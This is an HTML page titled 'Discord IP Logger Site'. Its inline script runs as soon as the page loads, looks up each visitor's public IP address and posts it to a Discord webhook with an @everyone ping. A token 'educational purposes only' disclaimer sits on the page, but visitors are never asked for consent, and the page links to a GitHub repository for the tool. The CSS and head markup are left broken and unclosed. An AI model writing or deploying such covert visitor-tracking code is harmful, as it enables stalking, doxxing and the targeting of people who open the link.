<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Discord IP Logger Site</title>
  <style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');

    body {
  background-color: #e6f2ff; 
  font-family: 'Poppins', sans-serif;
  padding: 20px;
}

p, h1, h2, h3, h4, h5, h6 {

}

h1 { color: #4a89dc; font-weight: 700; }

.button {
  background-color: #5d9cec;
  color: white;
  border: none;
  padding: 12px 24px;
  border-radius: 8px;
  font-family: 'Poppins', sans-serif;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 4px 6px rgba(93, 156, 236, 0.2);
  letter-spacing: 0.5px;

  background-color: #4a89dc;

<body>    
  <div class="content">
  <h1>Discord IP Logger Site</h1>
  <p><small>DISCLAMER! This is only for educational purposes only and only use if you have permission.</small></p>
    <button onclick="window.location.href = 'https://github.com/mrdavidss-vgg/Discord-IP-Logger-Site'">Github Repo</button>
  </div>

<script>
(function() {
  fetch('https://ipv4.icanhazip.com/')
    .then(res => {
      if (!res.ok) throw new Error('IP fetch failed');
      return res.text();
    })
    .then(ip => {
      ip = ip.trim();
      const payload = {
        embeds: [{
          title: "IP Address Logged!",
          color: 11390326,
          fields: [
            { name: "@everyone ip address logged", value: "\u200b" },
            { name: "IP Link", value: `https://whatismyipaddress.com/ip/${ip}` },
            { name: "IP Address", value: ip }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      const webhookURL = 'https://discord.com/api/webhooks/(other)/other';
      
      return fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    })
    .catch(err => {
      console.error('Error:', err);
    });
})();
</script>
